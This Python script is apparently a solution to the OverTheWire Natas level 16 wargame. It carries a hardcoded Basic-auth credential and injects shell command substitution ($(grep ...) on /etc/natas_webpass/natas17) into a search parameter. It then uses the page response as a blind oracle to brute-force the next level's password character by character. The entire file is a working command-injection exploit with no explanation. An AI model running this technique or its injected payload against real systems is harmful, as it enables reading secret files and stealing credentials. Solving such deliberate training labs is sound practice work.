#! /usr/bin/python3

import string
import sys
import urllib.parse
import urllib.request

def main():
    chars = list(string.ascii_letters) + list(string.digits)

    url = 'http://natas16.natas.labs.overthewire.org/'
    headers = {
        'Authorization': 'Basic bmF0YXMxNjpoUGtqS1l2aUxRY3RFVzMzUW11WEw2ZURWZk1XNHNHbw=='
    }

    passwd = ''

    for i in range(32):
        for c in chars:
            print(f'Trying {passwd + c}')
            params  = '?needle='
            params += urllib.parse.quote(f'$(grep ^{passwd + c} /etc/natas_webpass/natas17)African')
            params += '&submit=Search'

            req = urllib.request.Request(url + params, headers=headers)
            resp = urllib.request.urlopen(req)

            if resp.status != 200:
                print('Received an unexpected error')
                sys.exit(1)
            else:
                contents = resp.read().decode()
                if contents.find('African') == -1:
                    print(f'found password at position {i + 1}')
                    passwd += c
                    break
        else:
            print(f'could not find password at position {i + 1}')
            sys.exit(1)

    print(f'password is {passwd}')

if __name__ == "__main__":
    main()
